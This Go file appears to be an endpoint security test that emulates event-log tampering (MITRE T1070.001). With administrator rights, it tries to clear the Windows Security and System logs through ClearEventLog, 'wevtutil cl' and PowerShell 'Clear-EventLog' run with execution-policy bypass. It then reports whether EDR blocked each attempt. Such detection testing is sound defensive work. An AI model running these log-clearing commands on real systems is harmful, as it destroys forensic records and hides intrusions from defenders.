//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	cert_installer "github.com/preludeorg/libraries/go/tests/cert_installer"
	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	"golang.org/x/sys/windows"
)

const (
	testUUID = "510ca3a0-9e8a-471f-bdb6-c6639af863a1"
	testName = "Security Event Log Tampering"
)

// Windows Event Log constants
const (
	EVENTLOG_SEQUENTIAL_READ = 0x0001
	EVENTLOG_BACKWARDS_READ  = 0x0008
)

var (
	advapi32              = windows.NewLazySystemDLL("advapi32.dll")
	procOpenEventLog      = advapi32.NewProc("OpenEventLogW")
	procClearEventLog     = advapi32.NewProc("ClearEventLogW")
	procCloseEventLog     = advapi32.NewProc("CloseEventLog")
	procGetNumberOfEventLogRecords = advapi32.NewProc("GetNumberOfEventLogRecords")
)

// LogClearResults tracks results of each log clearing attempt
type LogClearResults struct {
	SecurityLogAPIBlocked      bool
	SystemLogAPIBlocked        bool
	SecurityLogWevtutilBlocked bool
	SystemLogWevtutilBlocked   bool
	SecurityLogPSBlocked       bool
	AnyLogCleared              bool
}

// getEventLogRecordCount returns the number of records in an event log
func getEventLogRecordCount(logName string) (uint32, error) {
	logNamePtr, err := syscall.UTF16PtrFromString(logName)
	if err != nil {
		return 0, err
	}

	handle, _, err := procOpenEventLog.Call(
		0,
		uintptr(unsafe.Pointer(logNamePtr)),
	)
	if handle == 0 {
		return 0, fmt.Errorf("OpenEventLog failed: %v", err)
	}
	defer procCloseEventLog.Call(handle)

	var recordCount uint32
	ret, _, err := procGetNumberOfEventLogRecords.Call(
		handle,
		uintptr(unsafe.Pointer(&recordCount)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("GetNumberOfEventLogRecords failed: %v", err)
	}

	return recordCount, nil
}

// attemptClearEventLogAPI tries to clear event log using Windows API
func attemptClearEventLogAPI(logName string) error {
	Endpoint.Say("  Using Windows API: ClearEventLog(\"%s\")", logName)

	logNamePtr, err := syscall.UTF16PtrFromString(logName)
	if err != nil {
		return fmt.Errorf("failed to convert log name: %v", err)
	}

	// Open event log
	handle, _, err := procOpenEventLog.Call(
		0,
		uintptr(unsafe.Pointer(logNamePtr)),
	)
	if handle == 0 {
		return fmt.Errorf("OpenEventLog failed (access denied): %v", err)
	}
	defer procCloseEventLog.Call(handle)

	// Attempt to clear the log
	ret, _, err := procClearEventLog.Call(
		handle,
		0, // No backup file
	)
	if ret == 0 {
		return fmt.Errorf("ClearEventLog failed (access denied): %v", err)
	}

	return nil
}

// attemptClearEventLogWevtutil tries to clear event log using wevtutil.exe
func attemptClearEventLogWevtutil(logName string) error {
	Endpoint.Say("  Using wevtutil.exe: cl %s", logName)

	cmd := exec.Command("wevtutil.exe", "cl", logName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("wevtutil failed: %v - %s", err, strings.TrimSpace(string(output)))
	}

	return nil
}

// attemptClearEventLogPowerShell tries to clear event log using PowerShell
func attemptClearEventLogPowerShell(logName string) error {
	Endpoint.Say("  Using PowerShell: Clear-EventLog -LogName %s", logName)

	psScript := fmt.Sprintf(`Clear-EventLog -LogName "%s" -ErrorAction Stop`, logName)
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", psScript)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("PowerShell command failed: %v - %s", err, strings.TrimSpace(string(output)))
	}

	return nil
}

func test() {
	// Initialize logger
	InitLogger(testUUID, testName)
	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic: %v", r))
			SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
		}
	}()

	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA Security Test")
	Endpoint.Say("=================================================================")
	Endpoint.Say("Test: %s", testName)
	Endpoint.Say("UUID: %s", testUUID)
	Endpoint.Say("MITRE ATT&CK: T1070.001 (Clear Windows Event Logs)")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	// Gather system information
	GatherSystemInfo()

	var results LogClearResults

	// Phase 1: Check prerequisites
	LogPhaseStart(1, "Prerequisites Check")
	Endpoint.Say("")
	Endpoint.Say("Phase 1: Checking Prerequisites")
	Endpoint.Say("-----------------------------------------------------------------")

	// Check if running as Administrator
	isAdmin := windows.GetCurrentProcessToken().IsElevated()
	if !isAdmin {
		Endpoint.Say("❌ ERROR: Test requires Administrator privileges")
		LogPhaseError(1, "Not running as Administrator")
		SaveLog(Endpoint.UnexpectedTestError, "Test requires Administrator privileges")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("✅ Running as Administrator")
	LogMessage("INFO", "Prerequisites", "Running with Administrator privileges")
	LogPhaseEnd(1, "success", "Prerequisites check passed")

	// Phase 2: Baseline event log verification
	LogPhaseStart(2, "Baseline Verification")
	Endpoint.Say("")
	Endpoint.Say("Phase 2: Verifying Event Log Baseline")
	Endpoint.Say("-----------------------------------------------------------------")

	// Check Security log
	securityRecords, err := getEventLogRecordCount("Security")
	if err != nil {
		Endpoint.Say("⚠️  WARNING: Could not query Security log: %v", err)
		LogMessage("WARN", "Baseline", fmt.Sprintf("Security log query failed: %v", err))
	} else {
		Endpoint.Say("✅ Security log has %d records", securityRecords)
		LogMessage("INFO", "Baseline", fmt.Sprintf("Security log: %d records", securityRecords))
	}

	// Check System log
	systemRecords, err := getEventLogRecordCount("System")
	if err != nil {
		Endpoint.Say("⚠️  WARNING: Could not query System log: %v", err)
		LogMessage("WARN", "Baseline", fmt.Sprintf("System log query failed: %v", err))
	} else {
		Endpoint.Say("✅ System log has %d records", systemRecords)
		LogMessage("INFO", "Baseline", fmt.Sprintf("System log: %d records", systemRecords))
	}

	LogPhaseEnd(2, "success", fmt.Sprintf("Security=%d, System=%d records", securityRecords, systemRecords))

	// Phase 3: Attempt to clear Security log via Windows API
	LogPhaseStart(3, "Security Log Clear (API)")
	Endpoint.Say("")
	Endpoint.Say("Phase 3: Attempting to Clear Security Log via Windows API")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("Technique: Direct Windows API call (ClearEventLog)")
	Endpoint.Say("Target: Security event log")
	Endpoint.Say("")

	err = attemptClearEventLogAPI("Security")
	if err != nil {
		Endpoint.Say("🛡️  Security log clearing BLOCKED: %v", err)
		LogMessage("INFO", "API Clear", fmt.Sprintf("Security log clear blocked: %v", err))
		results.SecurityLogAPIBlocked = true
		LogPhaseEnd(3, "blocked", "API access denied")
	} else {
		Endpoint.Say("⚠️  Security log clearing SUCCEEDED via API")
		LogMessage("CRITICAL", "API Clear", "Security log cleared via Windows API")
		results.SecurityLogAPIBlocked = false
		results.AnyLogCleared = true
		LogPhaseEnd(3, "success", "Security log cleared via API")
	}

	time.Sleep(1 * time.Second)

	// Phase 4: Attempt to clear System log via Windows API
	LogPhaseStart(4, "System Log Clear (API)")
	Endpoint.Say("")
	Endpoint.Say("Phase 4: Attempting to Clear System Log via Windows API")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("Technique: Direct Windows API call (ClearEventLog)")
	Endpoint.Say("Target: System event log")
	Endpoint.Say("")

	err = attemptClearEventLogAPI("System")
	if err != nil {
		Endpoint.Say("🛡️  System log clearing BLOCKED: %v", err)
		LogMessage("INFO", "API Clear", fmt.Sprintf("System log clear blocked: %v", err))
		results.SystemLogAPIBlocked = true
		LogPhaseEnd(4, "blocked", "API access denied")
	} else {
		Endpoint.Say("⚠️  System log clearing SUCCEEDED via API")
		LogMessage("CRITICAL", "API Clear", "System log cleared via Windows API")
		results.SystemLogAPIBlocked = false
		results.AnyLogCleared = true
		LogPhaseEnd(4, "success", "System log cleared via API")
	}

	time.Sleep(1 * time.Second)

	// Phase 5: Attempt to clear Security log via wevtutil
	LogPhaseStart(5, "Security Log Clear (wevtutil)")
	Endpoint.Say("")
	Endpoint.Say("Phase 5: Attempting to Clear Security Log via wevtutil.exe")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("Technique: wevtutil.exe cl Security")
	Endpoint.Say("")

	err = attemptClearEventLogWevtutil("Security")
	if err != nil {
		Endpoint.Say("🛡️  Security log clearing BLOCKED: %v", err)
		LogMessage("INFO", "Wevtutil Clear", fmt.Sprintf("Security log clear blocked: %v", err))
		results.SecurityLogWevtutilBlocked = true
		LogPhaseEnd(5, "blocked", "wevtutil execution blocked")
	} else {
		Endpoint.Say("⚠️  Security log clearing SUCCEEDED via wevtutil")
		LogMessage("CRITICAL", "Wevtutil Clear", "Security log cleared via wevtutil.exe")
		results.SecurityLogWevtutilBlocked = false
		results.AnyLogCleared = true
		LogPhaseEnd(5, "success", "Security log cleared via wevtutil")
	}

	time.Sleep(1 * time.Second)

	// Phase 6: Attempt to clear System log via wevtutil
	LogPhaseStart(6, "System Log Clear (wevtutil)")
	Endpoint.Say("")
	Endpoint.Say("Phase 6: Attempting to Clear System Log via wevtutil.exe")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("Technique: wevtutil.exe cl System")
	Endpoint.Say("")

	err = attemptClearEventLogWevtutil("System")
	if err != nil {
		Endpoint.Say("🛡️  System log clearing BLOCKED: %v", err)
		LogMessage("INFO", "Wevtutil Clear", fmt.Sprintf("System log clear blocked: %v", err))
		results.SystemLogWevtutilBlocked = true
		LogPhaseEnd(6, "blocked", "wevtutil execution blocked")
	} else {
		Endpoint.Say("⚠️  System log clearing SUCCEEDED via wevtutil")
		LogMessage("CRITICAL", "Wevtutil Clear", "System log cleared via wevtutil.exe")
		results.SystemLogWevtutilBlocked = false
		results.AnyLogCleared = true
		LogPhaseEnd(6, "success", "System log cleared via wevtutil")
	}

	time.Sleep(1 * time.Second)

	// Phase 7: Attempt to clear Security log via PowerShell
	LogPhaseStart(7, "Security Log Clear (PowerShell)")
	Endpoint.Say("")
	Endpoint.Say("Phase 7: Attempting to Clear Security Log via PowerShell")
	Endpoint.Say("-----------------------------------------------------------------")
	Endpoint.Say("Technique: Clear-EventLog -LogName Security")
	Endpoint.Say("")

	err = attemptClearEventLogPowerShell("Security")
	if err != nil {
		Endpoint.Say("🛡️  Security log clearing BLOCKED: %v", err)
		LogMessage("INFO", "PowerShell Clear", fmt.Sprintf("Security log clear blocked: %v", err))
		results.SecurityLogPSBlocked = true
		LogPhaseEnd(7, "blocked", "PowerShell execution blocked")
	} else {
		Endpoint.Say("⚠️  Security log clearing SUCCEEDED via PowerShell")
		LogMessage("CRITICAL", "PowerShell Clear", "Security log cleared via PowerShell")
		results.SecurityLogPSBlocked = false
		results.AnyLogCleared = true
		LogPhaseEnd(7, "success", "Security log cleared via PowerShell")
	}

	// Phase 8: Verify final state
	LogPhaseStart(8, "Final State Verification")
	Endpoint.Say("")
	Endpoint.Say("Phase 8: Verifying Final Event Log State")
	Endpoint.Say("-----------------------------------------------------------------")

	time.Sleep(2 * time.Second)

	finalSecurityRecords, err := getEventLogRecordCount("Security")
	if err != nil {
		Endpoint.Say("⚠️  WARNING: Could not verify Security log: %v", err)
		LogMessage("WARN", "Final State", fmt.Sprintf("Security log query failed: %v", err))
	} else {
		if finalSecurityRecords < securityRecords {
			Endpoint.Say("❌ Security log REDUCED: %d → %d records", securityRecords, finalSecurityRecords)
			LogMessage("CRITICAL", "Final State", fmt.Sprintf("Security log reduced: %d → %d", securityRecords, finalSecurityRecords))
			results.AnyLogCleared = true
		} else {
			Endpoint.Say("✅ Security log PRESERVED: %d records", finalSecurityRecords)
			LogMessage("INFO", "Final State", fmt.Sprintf("Security log preserved: %d records", finalSecurityRecords))
		}
	}

	finalSystemRecords, err := getEventLogRecordCount("System")
	if err != nil {
		Endpoint.Say("⚠️  WARNING: Could not verify System log: %v", err)
		LogMessage("WARN", "Final State", fmt.Sprintf("System log query failed: %v", err))
	} else {
		if finalSystemRecords < systemRecords {
			Endpoint.Say("❌ System log REDUCED: %d → %d records", systemRecords, finalSystemRecords)
			LogMessage("CRITICAL", "Final State", fmt.Sprintf("System log reduced: %d → %d", systemRecords, finalSystemRecords))
			results.AnyLogCleared = true
		} else {
			Endpoint.Say("✅ System log PRESERVED: %d records", finalSystemRecords)
			LogMessage("INFO", "Final State", fmt.Sprintf("System log preserved: %d records", finalSystemRecords))
		}
	}

	LogPhaseEnd(8, "success", fmt.Sprintf("Final: Security=%d, System=%d", finalSecurityRecords, finalSystemRecords))

	// Final Evaluation
	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("FINAL EVALUATION: Analyzing Protection Effectiveness")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	var finalExitCode int
	var finalReason string

	if !results.AnyLogCleared {
		// All log clearing attempts blocked - system is protected
		Endpoint.Say("✅ RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("System successfully prevented all event log tampering attempts")
		Endpoint.Say("")
		Endpoint.Say("Protection Summary:")
		Endpoint.Say("  ✅ Security log (API): PROTECTED")
		Endpoint.Say("  ✅ System log (API): PROTECTED")
		Endpoint.Say("  ✅ Security log (wevtutil): PROTECTED")
		Endpoint.Say("  ✅ System log (wevtutil): PROTECTED")
		Endpoint.Say("  ✅ Security log (PowerShell): PROTECTED")
		Endpoint.Say("")
		Endpoint.Say("Forensic Trail: INTACT")
		Endpoint.Say("Security Status: ENDPOINT IS SECURE")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = "System protected - all event log clearing attempts blocked"

	} else {
		// At least one log clearing succeeded - system is vulnerable
		Endpoint.Say("❌ RESULT: VULNERABLE")
		Endpoint.Say("=================================================================")
		Endpoint.Say("CRITICAL: System failed to prevent event log tampering")
		Endpoint.Say("")
		Endpoint.Say("Attack Results:")
		Endpoint.Say("  %s Security log (API): %s", getStatusIcon(!results.SecurityLogAPIBlocked), getClearStatus(!results.SecurityLogAPIBlocked))
		Endpoint.Say("  %s System log (API): %s", getStatusIcon(!results.SystemLogAPIBlocked), getClearStatus(!results.SystemLogAPIBlocked))
		Endpoint.Say("  %s Security log (wevtutil): %s", getStatusIcon(!results.SecurityLogWevtutilBlocked), getClearStatus(!results.SecurityLogWevtutilBlocked))
		Endpoint.Say("  %s System log (wevtutil): %s", getStatusIcon(!results.SystemLogWevtutilBlocked), getClearStatus(!results.SystemLogWevtutilBlocked))
		Endpoint.Say("  %s Security log (PowerShell): %s", getStatusIcon(!results.SecurityLogPSBlocked), getClearStatus(!results.SecurityLogPSBlocked))
		Endpoint.Say("")
		Endpoint.Say("Security Impact:")
		Endpoint.Say("  • Forensic evidence destroyed or compromised")
		Endpoint.Say("  • Incident response hindered by missing logs")
		Endpoint.Say("  • Attackers can cover their tracks")
		Endpoint.Say("  • Typical ransomware/APT anti-forensics technique")
		Endpoint.Say("")
		Endpoint.Say("IMMEDIATE ACTION REQUIRED:")
		Endpoint.Say("  • Enable protected event log forwarding to SIEM")
		Endpoint.Say("  • Review EDR event log protection settings")
		Endpoint.Say("  • Investigate why log clearing was not blocked")
		Endpoint.Say("  • Consider event log archival to immutable storage")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.Unprotected
		finalReason = "System vulnerable - event log clearing succeeded"
	}

	Endpoint.Say("")
	SaveLog(finalExitCode, finalReason)
	Endpoint.Stop(finalExitCode)
}

func getStatusIcon(success bool) string {
	if success {
		return "❌"
	}
	return "✅"
}

func getClearStatus(succeeded bool) string {
	if succeeded {
		return "CLEARED (vulnerable)"
	}
	return "PROTECTED"
}

func main() {
	// Initialize dropper
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// MANDATORY: Pre-flight certificate check (self-healing deployment)
	Endpoint.Say("Pre-flight: Checking F0RT1KA certificate...")
	if err := cert_installer.EnsureCertificateInstalled(); err != nil {
		Endpoint.Say("❌ FATAL: Certificate installation failed: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("✅ F0RT1KA certificate verified")

	// Run test
	test()
}
